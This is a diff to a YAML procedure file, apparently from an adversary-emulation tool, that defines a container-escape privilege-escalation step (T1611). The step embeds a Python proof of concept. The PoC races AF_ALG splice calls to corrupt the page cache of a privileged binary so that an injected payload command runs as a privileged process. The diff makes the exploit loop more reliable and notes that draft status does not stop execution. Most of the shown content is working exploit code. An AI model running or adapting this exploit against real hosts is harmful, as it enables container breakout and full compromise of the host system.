@@ -10,7 +10,7 @@ description: >
   See examples/Simple_Env/2_worker.yaml for a canonical victim pod manifest.
 tactic: "Privilege Escalation"
 techniques: ["Escape to Host", "T1611"]
-status: draft
+status: draft  # draft does not block execution; operator must ensure the node kernel is vulnerable
 effects:
   - container.escape(sys)
 parameters:
@@ -35,6 +35,7 @@ procedures:
   - key: copyfail-poc
     command: python3
     isLocal: true
+    # execute: handled by Go runtime only; Rust parser ignores this field
     execute:
       lang: python
       code: |-
@@ -62,11 +63,8 @@ procedures:
 
         def find_target():
             for path in TARGETS:
-                try:
-                    open(path, "rb").close()
+                if os.path.isfile(path):
                     return path
-                except OSError:
-                    continue
             return None
 
         def _splice(fd_in, fd_out, length):
@@ -100,26 +98,33 @@ procedures:
             needle = payload.rstrip(b"\x00")[:4]
             print(f"[*] CopyFail target: {target_path}")
             print(f"[*] Starting AF_ALG splice race ({max_rounds} rounds max)")
-            for i in range(max_rounds):
-                _splice(target_fd, pipe_w, 4096)
-                try:
-                    os.write(op_fd, payload)
-                except OSError:
-                    pass
-                try:
-                    os.read(pipe_r, 4096)
-                except OSError:
-                    pass
-                with open(target_path, "rb") as f:
-                    head = f.read(len(payload))
-                if needle in head:
-                    print(f"[+] Page-cache corruption confirmed after {i + 1} rounds")
-                    print(f"[+] '{payload_cmd}' runs next time a privileged process calls {target_path}")
-                    return True
-                if i % 1000 == 0 and i > 0:
-                    print(f"[*] Round {i}…")
-            print("[-] Race not won within max rounds — kernel may be patched")
-            return False
+            try:
+                for i in range(max_rounds):
+                    os.lseek(target_fd, 0, os.SEEK_SET)
+                    _splice(target_fd, pipe_w, 4096)
+                    try:
+                        os.write(op_fd, payload)
+                    except OSError:
+                        pass
+                    try:
+                        os.read(pipe_r, 4096)
+                    except OSError:
+                        pass
+                    with open(target_path, "rb") as f:
+                        head = f.read(len(payload))
+                    if needle in head:
+                        print(f"[+] Page-cache corruption confirmed after {i + 1} rounds")
+                        print(f"[+] '{payload_cmd}' runs next time a privileged process calls {target_path}")
+                        return True
+                    if i % 1000 == 0 and i > 0:
+                        print(f"[*] Round {i}…")
+                print("[-] Race not won within max rounds — kernel may be patched")
+                return False
+            finally:
+                os.close(target_fd)
+                os.close(op_fd)
+                os.close(pipe_r)
+                os.close(pipe_w)
 
         payload_cmd = "${PAYLOAD}"
         kernel = "${KERNEL_VERSION}" if "${KERNEL_VERSION}" else "unknown"
